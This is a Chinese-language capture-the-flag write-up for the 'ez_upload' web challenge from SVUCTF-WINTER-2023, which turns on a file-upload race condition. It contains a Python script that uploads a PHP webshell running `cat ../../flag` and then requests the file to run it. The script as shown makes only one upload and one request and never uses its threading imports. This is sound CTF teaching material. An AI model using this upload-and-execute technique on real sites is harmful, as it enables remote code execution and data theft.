# 上传？上传！

- 作者：Cee
- 参考：SVUCTF-WINTER-2023
- 难度：Easy
- 分类：Web
- 镜像：[svuctf-winter-2023/ez_upload](https://ghcr.io/svuctf/svuctf-winter-2023/ez_upload:latest)
- 端口：80

## 题目描述

老表说这一题很ez

## 题目解析

文件上传的条件竞争 Enjoy your Happy New Year Day! Best wishes!!!

题目可以使用两种解决办法 一种是python脚本 一种是使用burp

脚本如下

```python
import requests
import concurrent.futures
import threading

url = "" #填写你的url
session = requests.session()

# upload file
files = {'upload': ('xxx.php', '<?php system("cat ../../flag");')}
try:
    session.post(url=url, files=files, timeout=1)
except requests.exceptions.ReadTimeout:
    pass

# access file
resp = session.get(f"{url}/upload/xxx.php")  # 你的shell php
print(resp.text)
```

burp suite 的使用方法有空教你们 原理大差不差 都是竞争
